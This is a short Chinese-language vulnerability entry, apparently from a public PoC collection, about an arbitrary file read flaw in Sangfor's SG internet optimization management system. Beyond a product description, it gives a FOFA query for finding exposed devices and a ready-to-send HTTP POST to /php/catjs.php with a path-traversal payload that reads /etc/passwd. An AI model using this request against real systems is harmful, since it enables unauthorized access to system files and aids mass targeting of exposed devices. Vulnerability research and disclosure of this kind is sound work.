# 深信服SG上网优化管理系统catjs存在任意文件读取漏洞

# 一、漏洞简介
SANGFOR上网优化管理系统是一款集上网行为管理、网络准入、设备准入以及业务访问行为分析于一体的安全产品。核心优势：多种认证方式、全面的审计能力、支持多种应用的封堵、*的流量控制；准确识别iot设备、统一管理硬件资产；强管控违规用户，精细分析行为画像；部署实施简单，维护成本低。全网行为管理基于端点无感知、少故障节点、不影响原有网络为原则的产品设计理念，致力于给客户带来更好的使用体验。深信服SG上网优化管理系统catjs存在任意文件读取漏洞

# 二、影响版本
+ 深信服SG上网优化管理系统

# 三、资产测绘
+ fofa`title="SANGFOR上网优化管理"`
+ 特征


# 四、漏洞复现
```plain
POST /php/catjs.php HTTP/1.1
Host: 
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

["../../../../../../../etc/passwd"]
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zn0vntfcl2txn765>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
